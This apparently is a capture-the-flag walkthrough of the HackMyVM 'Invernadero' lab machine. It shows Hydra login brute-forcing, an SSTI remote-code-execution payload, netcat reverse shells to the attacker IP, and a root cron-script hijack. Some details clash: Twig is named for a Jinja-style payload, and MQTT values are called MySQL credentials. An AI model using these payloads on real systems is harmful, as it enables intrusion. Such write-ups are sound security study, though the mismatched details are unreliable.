+++
title = "Invernadero - Walkthrough"
date = "2026-09-22"
author = "nvru"
description = "Walkthrough for the Invernadero machine."
tags = [
"ctf",
"walkthrough",
"linux"
]
draft = false
+++

## Overview

- **Platform:** HackMyVM
- **Difficulty:** `Easy`
- **OS:** `Linux (Alpine)`
- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.10`

The objective was to enumerate the exposed services, identify an initial access vector, gain a foothold on the target, and escalate privileges to obtain a root shell.

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.10.10.10 -- -sC -sV -A -oA nmap/rust
```

#### Results

```text
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 10.3 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.68 ((Unix))
|_http-title: It works! Apache httpd
|_http-server-header: Apache/2.4.68 (Unix)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
8080/tcp open  http    syn-ack Werkzeug httpd 3.1.8 (Python 3.9.25)
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Werkzeug/3.1.8 Python/3.9.25
|_http-title: Did not follow redirect to /login
```

Three services were exposed: SSH (22), Apache (80), and a Flask application on port 8080.

### Service Enumeration

#### HTTP (Port 80)

Default Apache page. No `robots.txt`, no interesting directories found via feroxbuster or Nikto. Only notable finding was the `TRACE` HTTP method enabled.

#### HTTP (Port 8080) - Flask App

![Wappalyzer](/images/hmv/invernadero/wappa.png)

![Login Page](/images/hmv/invernadero/login.png)

The Flask application redirected to `/login` with a simple dashboard interface (Estadisticas, Alertas) requiring authentication.

No `robots.txt`, no directories found via brute force.

Credential brute force with Hydra succeeded:

```bash
hydra -l /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -s 8080 10.10.10.10 http-post-form "/login:username=^USER^&password=^PASS^:F=Usuario o contraseña incorrectos." -V
```

**Credentials found:** `admin:admin123`

![Dashboard](/images/hmv/invernadero/dashboard.png)

---

## Initial Access

### SSTI → RCE

![SSTI Engine Detection](/images/hmv/invernadero/ssti_eng.png)

Testing the dashboard inputs revealed a Server-Side Template Injection (SSTI) vulnerability. The template engine was identified as **Twig**.

![SSTI Test](/images/hmv/invernadero/ssti_test.png)

Payload for RCE:

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![RCE Confirmation](/images/hmv/invernadero/ssti_id.png)

Reverse shell via netcat:

```jinja
{{ request.application.__globals__.__builtins__.__import__('os').popen('nc 10.10.10.2 9001 -e /bin/sh').read() }}
```

```bash
nc -lnvp 9001
```

![Initial Shell](/images/hmv/invernadero/initial-shell.png)

Shell obtained as `operator` user inside a Docker container (confirmed by `/.dockerenv`).

---

## Privilege Escalation

### operator → root (Container Escape)

MySQL credentials found in `.env`:

```
MQTT_USER=admin_invernadero
MQTT_PASSWORD=admin_invernadero123
```

These credentials worked for SSH on the **host** machine (not the container), providing a shell as `operator` on the host.

![Host Shell](/images/hmv/invernadero/host-shell.png)

### Local Enumeration

- `sudo -l` → no permissions
- `doas -L` → no permissions
- Checked bash history (`.bash_history`) → found evidence of `find` binary having SUID

![Find SUID](/images/hmv/invernadero/find-suid.png)

However, `find` SUID did not directly yield root shell.

### Cron/Backup Script → Root

In `/opt`, a backup script (`backup_logs.sh`) was found, owned by root but **writable by operator**. The script runs periodically as root (likely via cron).

![Backup Script](/images/hmv/invernadero/backup-script.png)

Injected reverse shell payload:

```bash
busybox nc 10.10.10.2 9001 -e /bin/sh
```

Listener on attacker machine:

```bash
penelope -p 9001
# or
nc -lnvp 9001
```

![Reverse Shell](/images/hmv/invernadero/rev.png)

![Root Shell](/images/hmv/invernadero/root-shell.png)

Root access confirmed:

```bash
whoami
id
```

```
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## Credentials

```text
admin:admin123                  # Flask login
admin_invernadero:admin_invernadero123  # MQTT / SSH (host)
```

---

## Flags

### User

```text
flag{rce_ssti_conseguido} # Fake
flag{escape_de_contenedor_exitoso}
```

### Root

```text
flag{root_invernadero_comprometido}
```

---

## Attack Path

```text
Host Discovery
        ↓
Port Scanning
        ↓
Service Enumeration (Flask on 8080)
        ↓
Credential Brute Force (admin:admin123)
        ↓
SSTI in Dashboard → RCE
        ↓
Initial Shell as operator (container)
        ↓
Container Escape via SSH creds in .env
        ↓
Local Enumeration → Writable root-owned backup script
        ↓
Cron Job Hijack → Root Shell
```

---

## References

- [Penelope - Shell Handler](https://github.com/brightio/penelope)
- [GTFOBins - find](https://gtfobins.github.io/gtfobins/find/)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
